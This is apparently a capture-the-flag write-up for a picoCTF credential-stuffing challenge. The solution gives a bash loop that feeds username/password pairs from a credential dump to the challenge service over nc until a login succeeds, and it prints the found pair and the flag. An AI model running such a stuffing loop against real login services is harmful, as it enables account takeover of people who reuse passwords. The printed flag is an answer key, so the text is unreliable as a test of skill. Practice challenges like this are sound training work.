#### Descripción 
Credential stuffing is the automated injection of stolen username and password pairs (“credentials”) in to website login forms, in order to fraudulently gain access to user accounts.Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump `[here](https://challenge-files.picoctf.net/c_crystal_peak/d64a343f8ce5faa801bde93ccd0e26f5b4029b92504ed3b8891e4b3154264086/creds-dump.txt)`.There was a recent data breach at a famous department store, in which the login credentials of thousands of users were stolen and dumped online. You're hoping at least one person reused their credentials from the department store for an account at a local bank. Stuff those credentials and get the flag!Connect to the service with `nc crystal-peak.picoctf.net 57763`
#### Solución
```
FOUND: luis:papa
luis
papa

=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username: Password: 
Authenticating...
Welcome luis!
picoCTF{d0nt_r3u5e_cr3d3nt1als_e7627560}

-->>> Instrucción utilizada:
while IFS=';' read user pass; do
  echo "Probando $user:$pass"
  
  result=$( (echo "$user"; echo "$pass") | nc crystal-peak.picoctf.net 57763 )
  
  echo "$result" | grep -q "Invalid" || { 
    echo "FOUND: $user:$pass"
    echo "$result"
    break
  }

done < creds-dump.txt
```
#### Notas

#### Referencias


